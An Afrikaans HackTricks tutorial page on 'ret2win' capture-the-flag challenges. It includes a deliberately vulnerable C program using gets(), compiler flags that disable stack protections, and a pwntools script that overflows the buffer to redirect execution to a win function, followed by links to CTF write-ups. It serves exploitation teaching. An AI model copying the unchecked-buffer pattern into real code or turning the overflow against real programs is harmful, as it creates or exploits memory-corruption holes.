# Ret2win

{{#include ../../../banners/hacktricks-training.md}}

## Basiese Inligting

**Ret2win** uitdagings is 'n gewilde kategorie in **Capture The Flag (CTF)** kompetisies, veral in take wat **binarie uitbuiting** behels. Die doel is om 'n kwesbaarheid in 'n gegewe binêre te benut om 'n spesifieke, nie-aangeroep funksie binne die binêre uit te voer, wat dikwels iets soos `win`, `flag`, ens. genoem word. Hierdie funksie, wanneer dit uitgevoer word, druk gewoonlik 'n vlag of 'n suksesboodskap uit. Die uitdaging behels tipies die oorskryding van die **terugadres** op die stapel om die uitvoeringsvloei na die gewenste funksie te lei. Hier is 'n meer gedetailleerde verduideliking met voorbeelde:

### C Voorbeeld

Oorweeg 'n eenvoudige C-program met 'n kwesbaarheid en 'n `win` funksie wat ons van plan is om aan te roep:
```c
#include <stdio.h>
#include <string.h>

void win() {
printf("Congratulations! You've called the win function.\n");
}

void vulnerable_function() {
char buf[64];
gets(buf); // This function is dangerous because it does not check the size of the input, leading to buffer overflow.
}

int main() {
vulnerable_function();
return 0;
}
```
Om hierdie program te kompileer sonder stapelbeskerming en met **ASLR** gedeaktiveer, kan jy die volgende opdrag gebruik:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
- `-m32`: Compile die program as 'n 32-bit binêre (dit is opsioneel maar algemeen in CTF-uitdagings).
- `-fno-stack-protector`: Deaktiveer beskerming teen stapeloorloope.
- `-z execstack`: Laat uitvoering van kode op die stapel toe.
- `-no-pie`: Deaktiveer Posisie Onafhanklike Uitvoerbare om te verseker dat die adres van die `win` funksie nie verander nie.
- `-o vulnerable`: Noem die uitvoer lêer `vulnerable`.

### Python Exploit met Pwntools

Vir die exploit, sal ons **pwntools** gebruik, 'n kragtige CTF-raamwerk vir die skryf van exploits. Die exploit-skrip sal 'n payload skep om die buffer oor te loop en die terugkeeradres met die adres van die `win` funksie te oorskryf.
```python
from pwn import *

# Set up the process and context for the binary
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path

# Find the address of the win function
win_addr = p32(0x08048456)  # Replace 0x08048456 with the actual address of the win function in your binary

# Create the payload
# The buffer size is 64 bytes, and the saved EBP is 4 bytes. Hence, we need 68 bytes before we overwrite the return address.
payload = b'A' * 68 + win_addr

# Send the payload
p.sendline(payload)
p.interactive()
```
Om die adres van die `win` funksie te vind, kan jy **gdb**, **objdump**, of enige ander hulpmiddel gebruik wat jou toelaat om binêre lêers te ondersoek. Byvoorbeeld, met `objdump`, kan jy gebruik:
```sh
objdump -d vulnerable | grep win
```
Hierdie opdrag sal jou die assembly van die `win` funksie wys, insluitend sy beginadres.&#x20;

Die Python-skrip stuur 'n sorgvuldig saamgestelde boodskap wat, wanneer dit deur die `vulnerable_function` verwerk word, die buffer oorloop en die terugkeeradres op die stapel met die adres van `win` oorskryf. Wanneer `vulnerable_function` terugkeer, spring dit na `win` in plaas daarvan om na `main` terug te keer of te verlaat, en die boodskap word gedruk.

## Beskermings

- [**PIE**](../../common-binary-protections-and-bypasses/pie/index.html) **moet gedeaktiveer word** sodat die adres betroubaar is oor uitvoerings of die adres waar die funksie gestoor sal word nie altyd dieselfde sal wees nie en jy 'n lek nodig sal hê om uit te vind waar die win funksie gelaai is. In sommige gevalle, wanneer die funksie wat die oorloop veroorsaak `read` of soortgelyk is, kan jy 'n **Deeltelike Oorskrywing** van 1 of 2 bytes doen om die terugkeeradres na die win funksie te verander. Vanweë hoe ASLR werk, is die laaste drie hex nibble nie gerandomiseer nie, so daar is 'n **1/16 kans** (1 nibble) om die korrekte terugkeeradres te kry.
- [**Stack Canaries**](../../common-binary-protections-and-bypasses/stack-canaries/index.html) moet ook gedeaktiveer word of die gecompromitteerde EIP terugkeeradres sal nooit gevolg word nie.

## Ander voorbeelde & Verwysings

- [https://ir0nstone.gitbook.io/notes/types/stack/ret2win](https://ir0nstone.gitbook.io/notes/types/stack/ret2win)
- [https://guyinatuxedo.github.io/04-bof_variable/tamu19_pwn1/index.html](https://guyinatuxedo.github.io/04-bof_variable/tamu19_pwn1/index.html)
- 32bit, geen ASLR
- [https://guyinatuxedo.github.io/05-bof_callfunction/csaw16_warmup/index.html](https://guyinatuxedo.github.io/05-bof_callfunction/csaw16_warmup/index.html)
- 64 bits met ASLR, met 'n lek van die bin adres
- [https://guyinatuxedo.github.io/05-bof_callfunction/csaw18_getit/index.html](https://guyinatuxedo.github.io/05-bof_callfunction/csaw18_getit/index.html)
- 64 bits, geen ASLR
- [https://guyinatuxedo.github.io/05-bof_callfunction/tu17_vulnchat/index.html](https://guyinatuxedo.github.io/05-bof_callfunction/tu17_vulnchat/index.html)
- 32 bits, geen ASLR, dubbele klein oorloop, eerste om die stapel oor te loop en die grootte van die tweede oorloop te vergroot
- [https://guyinatuxedo.github.io/10-fmt_strings/backdoor17_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt_strings/backdoor17_bbpwn/index.html)
- 32 bit, relro, geen canary, nx, geen pie, formaat string om die adres `fflush` met die win funksie (ret2win) te oorskryf
- [https://guyinatuxedo.github.io/15-partial_overwrite/tamu19_pwn2/index.html](https://guyinatuxedo.github.io/15-partial_overwrite/tamu19_pwn2/index.html)
- 32 bit, nx, niks anders nie, gedeeltelike oorskrywing van EIP (1Byte) om die win funksie aan te roep
- [https://guyinatuxedo.github.io/15-partial_overwrite/tuctf17_vulnchat2/index.html](https://guyinatuxedo.github.io/15-partial_overwrite/tuctf17_vulnchat2/index.html)
- 32 bit, nx, niks anders nie, gedeeltelike oorskrywing van EIP (1Byte) om die win funksie aan te roep
- [https://guyinatuxedo.github.io/35-integer_exploitation/int_overflow_post/index.html](https://guyinatuxedo.github.io/35-integer_exploitation/int_overflow_post/index.html)
- Die program valideer slegs die laaste byte van 'n getal om die grootte van die invoer te kontroleer, daarom is dit moontlik om enige grootte by te voeg solank die laaste byte binne die toegelate reeks is. Dan, die invoer skep 'n buffer oorloop wat met 'n ret2win uitgebuit word.
- [https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/](https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/)
- 64 bit, relro, geen canary, nx, pie. Gedeeltelike oorskrywing om die win funksie (ret2win) aan te roep
- [https://8ksec.io/arm64-reversing-and-exploitation-part-3-a-simple-rop-chain/](https://8ksec.io/arm64-reversing-and-exploitation-part-3-a-simple-rop-chain/)
- arm64, PIE, dit gee 'n PIE lek die win funksie is eintlik 2 funksies so ROP gadget wat 2 funksies aanroep
- [https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/](https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/)
- ARM64, off-by-one om 'n win funksie aan te roep

## ARM64 Voorbeeld

{{#ref}}
ret2win-arm64.md
{{#endref}}

{{#include ../../../banners/hacktricks-training.md}}
